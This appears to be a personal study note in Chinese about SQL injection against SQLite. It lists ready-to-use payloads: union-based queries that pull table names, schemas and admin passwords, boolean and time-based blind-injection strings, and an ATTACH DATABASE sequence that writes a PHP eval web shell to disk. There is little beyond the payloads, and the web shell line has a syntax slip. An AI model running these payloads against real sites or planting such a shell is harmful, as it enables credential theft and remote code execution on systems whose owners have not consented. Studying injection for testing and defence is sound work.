sql注入

是否存在注入：即判断当前输入是否被当作参数服务器执行sql语句

字段数：`order by 2`，按照第二个字段排序

union联合查询，因为`1=2`是错误的，所以最终也就执行了union的select语句

```sqlite
判断是否存在注入： and 1=2
判断字段数: order by 2
寻找显错位:union select 1,2
查询表名:and 1=2 union select 1,name from sqlite_master where type='table' limit 2,1
查询列名:and 1=2 union select 1,sql from sqlite_master where type='table' and name='admin'
查询具体数据
and 1=2 union select 1,password from admin
```







盲注

有时候目标存在注入，但在页面上没有任何回显，此时，我们需要利用一些方法进行判断或者尝试得到数据，这个过程称之为盲注。

盲注函数

```sql
length()函数返回字符串的长度
and length((select name from sqlite_master where type='table' limit 1,1)) > 1

substr(截取的内容,位数,个数)截取字符串，从第一位截取一个
and substr((select name from sqlite_master where type='table' limit 1,1),1,1)='a'

CASE WHEN<条件表达式>THEN<为真返回值>ELSE<为假返回值>END

randomblob()函数，生成随机字符串，可用来代替sleep造成延时
and 1=(case when(substr(sqlite_version(),1,1)='3') then randomblob(100000000) else 0 end)

```



![image-20210923153203954](C:\Users\jun Ding\AppData\Roaming\Typora\typora-user-images\image-20210923153203954.png)



sqlite写马

```sqlite
ATTACH DATABASE 'D://sqlite.php' AS shell;
CREATE TABLE shell.php(payload text);
INSERT INTO shell.php(payload) VALUES('<?php eval($_REQUEST[1];?>');
```

eval()括号中的内容被当作php代码执行，传入`1=参数`，`$_REQUEST`就被参数代替。







显错注入

报错注入

盲注

dns_log：<mark>盲注变显错</mark>











